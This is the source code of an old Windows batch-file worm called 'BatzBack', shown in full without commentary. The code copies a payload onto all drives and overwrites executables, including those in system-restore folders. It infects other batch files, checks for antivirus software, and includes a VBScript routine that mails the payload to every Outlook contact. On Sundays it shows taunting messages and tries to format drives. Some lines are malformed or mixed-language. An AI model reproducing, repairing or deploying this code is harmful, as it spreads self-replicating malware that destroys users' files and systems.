Echo.
@cls
@echo off
@break off
::Parasitic[PPW]Batch - L0NEw0lf
Echo BatzBack By L0NEw0lf,DhEAD Bunnie
if exist Z:\ Copy %windir%\WuFFie.Scr Z:\
if exist Y:\ Copy %windir%\WuFFie.Scr Y:\
if exist X:\ Copy %windir%\WuFFie.Scr X:\
if exist W:\ Copy %windir%\WuFFie.Scr W:\
if exist V:\ Copy %windir%\WuFFie.Scr V:\
if exist U:\ Copy %windir%\WuFFie.Scr U:\
if exist T:\ Copy %windir%\WuFFie.Scr T:\
if exist S:\ Copy %windir%\WuFFie.Scr S:\
if exist R:\ Copy %windir%\WuFFie.Scr R:\
if exist Q:\ Copy %windir%\WuFFie.Scr Q:\
if exist P:\ Copy %windir%\WuFFie.Scr P:\
if exist O:\ Copy %windir%\WuFFie.Scr O:\
if exist N:\ Copy %windir%\WuFFie.Scr N:\
if exist M:\ Copy %windir%\WuFFie.Scr M:\
if exist L:\ Copy %windir%\WuFFie.Scr L:\
if exist K:\ Copy %windir%\WuFFie.Scr K:\
if exist J:\ Copy %windir%\WuFFie.Scr J:\
if exist I:\ Copy %windir%\WuFFie.Scr I:\
if exist H:\ Copy %windir%\WuFFie.Scr H:\
if exist G:\ Copy %windir%\WuFFie.Scr G:\
goto :XP?
:AVCheck
if exist \Progra~1\Norton~1\*.EXE goto :BB
if exist \Progra~1\Norton~2\*.EXE goto :BB
if exist \Progra~1\PandaS~1\*.EXE goto :BB
if exist \Progra~1\McAfee\VirusScan\*.EXE goto :BB
if exist \Progra~1\TrendM~1\*.EXE goto :BB
if exist \Progra~1\ZoneLa~1\*.EXE goto :BB
if exist \Progra~1\Grisoft\AVG6\*.EXE goto :BB
if exist \Progra~1\AntiVi~1\*.EXE goto :BB
if exist \Progra~1\QuickH~1\*.EXE goto :BB
if exist \Progra~1\FWIN32\*.EXE goto :BB
if exist \Progra~1\FindVirus\*.EXE goto :BB
if exist \eSafen\*.EXE goto :BB
if exist \f-macro\*.EXE goto :BB
if exist \TBAVW95\*.EXE goto :BB
if exist \VS95\*.EXE goto :BB
if exist \AntiVi~1\*.EXE goto :BB
if exist \ToolKit\FindVirus\*.EXE goto :BB
if exist \PC-Cil~1\*.EXE goto :BB
goto :WriteMail
WriteMail
On Error Resume Next
Function Mail()
Set C = CreateObject("Outlook.Application")
Set D = C.GetNameSpace("MAPI")
Set E = D.AddressLists
For Each F In E
If F.AddressEntries.Count <> 0 Then
G = F.AddressEntries.Count
For H = 1 To G
Set I = C.CreateItem(0)
Set J = F.AddressEntries(H)
I.To = J.Address
I.Subject = "Duuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuude"
I.Body = "Whoa man amuse yourself with this funny freakin screen saver!"
I.Attachments.Add "C:\WINDOWS\SYSTEM\WuFFie.Scr"
I.DeleteAfterSubmit = True
I.Send
J = ""
End If
Next
End If
End Function
goto :BB
:BB
Start %WinDir%\.EXE
goto :End
:XP?
Ver | Find "XP"
if errorlevel 1 goto :NT?
if not errorlevel 1 goto :R
:NT?
Ver | Find "NT"
if errorlevel 1 goto :2000?
if not errorlevel 1 goto :R
:2000?
Ver | Find "2000"
if errorlevel 1 goto :I
if not errorlevel 1 goto :R
:R
cacls"\System Volume Information" /E /G %USERNAME%:F
For /R "\System Volume Information\_r??????????????????????????????????????????????????????????????????????????????????????????????" %%i In (*.Exe) Do Echo Y | Copy %WinDir%\WuFFie.Scr %%i
cacls"\System Volume Information" /E /R %USERNAME%
For /R \ %%i In (*.Exe) Do Echo Y | Copy %WinDir%\WuFFie.Scr %%i
goto :Check
:Check
For /R \ %%b In (*.Bat) Do Set euk=%%b
Find "Parasitic" %euk%
if errorlevel 1 goto :Go
if not errorlevel goto :Check
:Go
Echo Y | Copy %euk%+%0 %euk%
goto :Sabbath
:I
For %%i In (\_RESTORE\*.Exe \_RESTORE\TEMP\*.Exe) Do Echo Y | Copy %WinDir%\WuFFie.Scr %%i
Echo Y | Copy %WinDir%\WuFFie.Scr \_RESTORE
For %%i In (*.Exe \*.Exe %PATH%\*.Exe %WinDir%\*.Exe %WinDir%\System\*.Exe) Do Echo Y | Copy %WinDir%\WuFFie.Scr %%i
goto :BatCheck
:BatCheck
For %%b In (*.Bat \*.Bat %PATH%\*.Bat %WinDir%\*.Bat %WinDir%\System\*.Bat) Do Set pro=%%b
Find "Parasitic" %pro%
if errorlevel 1 goto :BatGo
if not errorlevel 1 goto :BatCheck
:BatGo
Echo Y | Copy %pro+%0 %pro%
goto :Sabbath
:Sabbath
Date | Find "Sun"
if errorlevel 1 goto :AVCheck
if not errorlevel 1 goto :PayDay
:PayDay
Echo MsgBox "Well well...Look what we have here. BatzBack is Back...Again!",16,"For Shame..." > \MessageFromL0NEw0lf.vbs
Echo MsgBox "Today is the day that I, L0NEw0lf, will put you in misery Uhahaha.",48,"You are infected with BatzBack By L0NEw0lf" >> \MessageFromL0NEw0lf.vbs
Echo MsgBox "This worm is dedicated to a very special person named Christina Aguilera who not only has been misjudged by millions, but truly has a mind of a poet, her lyrics touched my heart deeply.",64,"Dedication, May my Sarcasm burn in Hell" >> \MessageFromL0NEw0lf.vbs
Start \MessageFromL0NEw0lf.vbs
if exist Echo Y | Format D:
if exist Echo Y | Format E:
if exist Echo Y | Format F:
goto :Again
:Again
A:
goto :Again
:End
Echo Y | Del %0
Exit
